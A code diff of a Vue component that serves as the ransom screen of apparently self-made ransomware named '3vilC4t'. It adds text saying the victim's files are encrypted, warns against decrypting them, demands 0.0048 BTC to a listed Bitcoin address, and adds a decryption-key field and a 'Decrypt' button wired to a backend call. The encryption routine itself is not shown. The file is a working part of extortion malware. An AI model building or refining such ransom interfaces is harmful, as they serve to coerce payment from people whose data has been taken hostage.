@@ -1,7 +1,11 @@
 <template>
   <div class="container">
-    <h1>{{message}}</h1>
-    <!-- <a @click="getMessage">Press Me!</a> -->
+    <div :title="message">{{message}}</div>
+    <img alt="3vilC4t" src="../assets/images/logo.png" class="logo zoomIn">
+    <p :title="message2">{{message2}}</p>
+    <p :title="address">{{address}}</p>
+    <input type="text" id="decKey" name="decKey" placeholder="Decryption Key">
+    <a @click="launchForm">Decrypt</a>
   </div>
 </template>
 
@@ -9,11 +13,13 @@
 export default {
   data() {
     return {
-      message: "You have been infected by 3vilC4t virus. Your files have been encrypted. Only I have the key to restore your files. If you try to decrypt it on your own, you may cause irreversible damage and they will not be able to be restored. Address coming soon."
+      message: "You have been infected by 3vilC4t virus. Your files have been encrypted. Do not attempt to decrypt it on your own. It will cause irreversible damage.\n",
+      message2: "Pay the ransom to receive the decryption key. You only have 1 attempt.",
+      address: "0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf "
     };
   },
   methods: {
-    getMessage: function() {
+    launchForm: function() {
       var self = this;
       window.backend.basic().then(result => {
         self.message = result;
@@ -32,9 +38,9 @@ h1 {
   width: 100%;
 }
 a:hover {
-  font-size: 1.7em;
-  border-color: blue;
-  background-color: blue;
+  font-size: 1.4em;
+  border-color: #77079d;
+  background-color: #77079d;
   color: white;
   border: 3px solid white;
   border-radius: 10px;
@@ -43,11 +49,11 @@ a:hover {
   transition: 500ms;
 }
 a {
-  font-size: 1.7em;
-  border-color: white;
+  font-size: 1.1em;
+  border-color: #77079d;
   background-color: #121212;
-  color: white;
-  border: 3px solid white;
+  color: #77079d;
+  border: 3px solid #77079d;
   border-radius: 10px;
   padding: 9px;
   cursor: pointer;
